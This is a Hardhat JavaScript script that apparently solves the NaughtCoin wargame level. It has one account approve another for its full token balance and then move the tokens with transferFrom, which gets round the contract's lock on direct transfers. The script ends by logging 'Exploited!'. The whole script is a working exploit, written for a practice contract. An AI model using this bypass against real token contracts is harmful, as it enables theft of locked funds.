const { ethers } = require("hardhat")

async function main() {
    const accounts = await ethers.getSigners()
    const deployer = accounts[0]
    const player = accounts[1]

    const naughtCoin = await ethers.getContract("NaughtCoin")

    console.log(`Number of NaughtCoins deployed: ${await naughtCoin.INITIAL_SUPPLY()}`)
    console.log(`Balance of ${deployer.address}: ${await naughtCoin.balanceOf(deployer.address)}`)
    console.log(`Balance of ${player.address}: ${await naughtCoin.balanceOf(player.address)}`)

    const allow = await naughtCoin
        .connect(deployer)
        .approve(player.address, await naughtCoin.balanceOf(deployer.address))

    console.log(
        `${player.address} approved for ${await naughtCoin.balanceOf(deployer.address)} tokens`
    )

    const transfer = await naughtCoin
        .connect(player)
        .transferFrom(
            deployer.address,
            player.address,
            await naughtCoin.balanceOf(deployer.address)
        )

    console.log(`Transfer successful!`)

    console.log(`Balance of ${deployer.address}: ${await naughtCoin.balanceOf(deployer.address)}`)
    console.log(`Balance of ${player.address}: ${await naughtCoin.balanceOf(player.address)}`)
    console.log(`Exploited!`)
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
